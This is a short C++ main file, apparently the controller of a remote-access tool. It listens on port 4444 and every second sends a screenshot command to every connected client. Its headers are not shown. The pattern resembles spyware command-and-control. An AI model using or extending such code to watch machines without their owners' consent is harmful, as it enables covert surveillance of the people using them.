#include "Server.h"
#include <iostream>
#include <string>
using namespace std;



int main() {
    Server serv(4444);
    serv.start();


    while (true) {
        Sleep(1000);
  
        auto clients = serv.get_all_clients_data();

        for (auto c : clients) {

            serv.send_command(c.hostName, Command::GET_SCREENSHOT);
        }
       
    }

    WSACleanup();
    return 0;
}
